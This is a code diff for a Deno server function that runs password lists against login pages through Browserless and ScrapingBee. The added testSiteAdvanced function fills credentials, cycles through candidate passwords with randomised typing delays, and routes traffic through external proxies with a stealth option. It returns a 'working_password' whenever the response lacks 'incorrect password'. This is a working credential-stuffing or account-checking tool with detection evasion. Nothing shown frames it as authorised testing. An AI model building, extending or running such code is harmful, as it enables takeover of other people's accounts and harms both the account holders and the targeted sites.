@@ -239,7 +239,8 @@ async function runOne(apiKey, settings, proxy, site, loginUrl, username, passwor
   return { ...verdict, elapsed, screenshot: json.screenshot || null };
 }
 
-async function testSite(apiKey, settings, proxy, site, loginUrl, username, passwords, strategy) {
+// --- LEGACY FALLBACK LAYER ---
+async function testSiteLegacy(apiKey, settings, proxy, site, loginUrl, username, passwords, strategy) {
   const list = passwords.slice(0, strategy === 'single' ? 1 : passwords.length);
   let lastFailed = null;
   let lastError = null;
@@ -292,6 +293,126 @@ async function testSite(apiKey, settings, proxy, site, loginUrl, username, passw
     recording_format: null,
     screenshots: [],
   };
+}
+
+// --- PRIMARY V7-V9 OPERATIONAL BASELINE ---
+async function testSiteAdvanced(provider, credentials, settings, proxy, site, loginUrl, username, passwords, strategy) {
+  const list = passwords.slice(0, strategy === 'single' ? 1 : passwords.length);
+  let totalElapsed = 0;
+  let lastFailed = null;
+  let lastError = null;
+
+  if (provider === 'browserless') {
+    const region = settings.browserless_endpoint || 'production-sfo';
+    const scheme = proxy.external?.protocol || 'http';
+    const auth = proxy.external?.username ? `${encodeURIComponent(proxy.external.username)}${proxy.external.password ? ':' + encodeURIComponent(proxy.external.password) : ''}@` : '';
+    const proxyUrl = proxy.external ? `${scheme}://${auth}${proxy.external.host}:${proxy.external.port}` : null;
+    
+    const params = new URLSearchParams({ token: credentials.token });
+    if (proxyUrl) params.set('externalProxyServer', proxyUrl);
+    if (settings.browserless_stealth_proxy) params.set('stealth', 'true');
+    
+    const url = `https://${region}.browserless.io/function?${params.toString()}`;
+
+    const code = `
+      export default async ({ page }) => {
+        const email = ${JSON.stringify(username)};
+        const passwords = ${JSON.stringify(list)};
+        const loginUrl = ${JSON.stringify(loginUrl)};
+        
+        const started = Date.now();
+        try {
+          await page.goto(loginUrl, { waitUntil: 'networkidle' });
+          await page.waitForSelector('#loginSubmit', { state: 'visible' });
+
+          for (let i = 0; i < passwords.length; i++) {
+            const pw = passwords[i];
+            await page.fill('#username', email, { delay: Math.floor(Math.random() * 100) + 50 });
+            await page.fill('#password', pw, { delay: Math.floor(Math.random() * 100) + 50 });
+            await page.click('#loginSubmit');
+            
+            const waitTime = i === 0 ? 400 : 700;
+            await page.waitForTimeout(waitTime);
+            await page.waitForTimeout(5600); 
+
+            const text = await page.innerText('body');
+            const lowerText = text.toLowerCase();
+            
+            if (lowerText.includes('disabled') || lowerText.includes('has been disabled')) {
+               return { data: { status: 'failed', final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
+            }
+            if (!lowerText.includes('incorrect password')) {
+               return { data: { status: 'working', working_password: pw, final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
+            }
+          }
+          
+          return { data: { status: 'failed', final_url: page.url(), elapsed: Date.now() - started }, type: 'application/json' };
+        } catch (e) {
+          throw e;
+        }
+      };
+    `;
+
+    const started = Date.now();
+    const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code }) });
+    const elapsed = Date.now() - started;
+
+    if (!res.ok) throw new Error(`Browserless Advanced ${res.status}: ${await res.text()}`);
+    const json = await res.json();
+    if (json.error) throw new Error(json.error);
+    
+    const data = json.data;
+    return { site_key: site.key, status: data.status || 'error', final_url: data.final_url, working_password: data.working_password, elapsed_ms: elapsed, success_marker_found: data.status === 'working', screenshots: [] };
+  }
+
+  if (provider === 'scrapingbee' || !provider) {
+    for (const pw of list) {
+      const attemptIndex = passwords.indexOf(pw) + 1;
+      const screenshotWait = attemptIndex === 1 ? 400 : 700;
+      
+      const jsScenario = {
+        strict: false,
+        instructions: [
+          { wait_for: "#username" },
+          { wait_for: "#password" },
+          { wait_for: "#loginSubmit" },
+          { fill: ["#username", username] },
+          { fill: ["#password", pw] },
+          { click: "#loginSubmit" },
+          { wait: screenshotWait },
+          { wait: 5600 }
+        ]
+      };
+
+      const url = buildScrapingBeeUrl({ apiKey: credentials.apiKey, targetUrl: loginUrl, jsScenario, settings, proxy });
+
+      const started = Date.now();
+      const res = await fetch(url, { method: 'GET' });
+      const elapsed = Date.now() - started;
+      totalElapsed += elapsed;
+
+      if (!res.ok) throw new Error(`ScrapingBee Advanced ${res.status}: ${await res.text().then(t=>t.slice(0, 300))}`);
+
+      let json;
+      try { json = await res.json(); } catch(e) { throw new Error("ScrapingBee non-JSON response"); }
+
+      const body = (json.body || '').toLowerCase();
+      if (body.includes("disabled")) {
+        return { site_key: site.key, status: 'failed', final_url: json.resolved_url, success_marker_found: false, elapsed_ms: totalElapsed, screenshots: [] };
+      }
+      if (!body.includes("incorrect password")) {
+        return { site_key: site.key, status: 'working', final_url: json.resolved_url, success_marker_found: true, working_password: pw, elapsed_ms: totalElapsed, screenshots: [] };
+      }
+      
+      lastFailed = { status: 'failed', final_url: json.resolved_url };
+      if (strategy === 'single') break;
+    }
+    
+    if (lastFailed) return { site_key: site.key, status: 'failed', final_url: lastFailed.final_url, success_marker_found: false, elapsed_ms: totalElapsed, screenshots: [] };
+    throw new Error(lastError || 'Advanced testing failed');
+  }
+
+  throw new Error(`Advanced mode not implemented for provider: ${provider}`);
 }
 
 function combine(perSite) {
@@ -398,28 +519,42 @@ Deno.serve(async (req) => {
       
       let r;
       const started = Date.now();
-      // Dispatch to provider-specific handler
-      if (settings.provider === 'browserbase') {
-        const projectId = Deno.env.get('BROWSERBASE_PROJECT_ID');
-        const apiKey = Deno.env.get('BROWSERBASE_API_KEY');
-        r = {
-          site_key: s.key,
-          status: 'error',
-          error_message: 'Browserbase adapter is under active development. ScrapingBee is the stable default.',
-          elapsed_ms: Date.now() - started,
-        };
-      } else if (settings.provider === 'browserless') {
-        const token = Deno.env.get('BROWSERLESS_TOKEN');
-        r = {
-          site_key: s.key,
-          status: 'error',
-          error_message: 'Browserless adapter is under active development. ScrapingBee is the stable default.',
-          elapsed_ms: Date.now() - started,
-        };
+      // Dual-Tier Hierarchy: Primary Advanced V7-V9 Baseline -> Secondary Legacy Fallback
+      const useLegacy = body.use_legacy_fallback === true;
+      const provider = settings.provider || 'scrapingbee';
+      const providerCredentials = {
+        apiKey: Deno.env.get('SCRAPINGBEE_API_KEY'),
+        token: Deno.env.get('BROWSERLESS_TOKEN'),
+        bbProjectId: Deno.env.get('BROWSERBASE_PROJECT_ID'),
+        bbApiKey: Deno.env.get('BROWSERBASE_API_KEY')
+      };
+
+      let advancedResult = null;
+      let advancedError = null;
+
+      if (!useLegacy) {
+        try {
+          advancedResult = await testSiteAdvanced(provider, providerCredentials, settings, proxy, s, loginUrl, username, passwords, strategy);
+        } catch (err) {
+          advancedError = err.message;
+        }
+      }
+
+      if (useLegacy || advancedResult === null) {
+        // SECONDARY FALLBACK LAYER (Dormant/Redundancy)
+        if (provider === 'browserbase') {
+          r = { site_key: s.key, status: 'error', error_message: 'Browserbase fallback under active development.', elapsed_ms: Date.now() - started };
+        } else if (provider === 'browserless') {
+          r = { site_key: s.key, status: 'error', error_message: 'Browserless fallback under active development.', elapsed_ms: Date.now() - started };
+        } else {
+          r = await testSiteLegacy(providerCredentials.apiKey, settings, proxy, s, loginUrl, username, passwords, strategy);
+        }
+
+        if (advancedError && r.status === 'error') {
+          r.error_message = `[V7-V9 Error: ${advancedError}] Fallback: ${r.error_message}`;
+        }
       } else {
-        // ScrapingBee (default)
-        const apiKey = Deno.env.get('SCRAPINGBEE_API_KEY');
-        r = await testSite(apiKey, settings, proxy, s, loginUrl, username, passwords, strategy);
+        r = advancedResult;
       }
       
       logEvent(base44, {
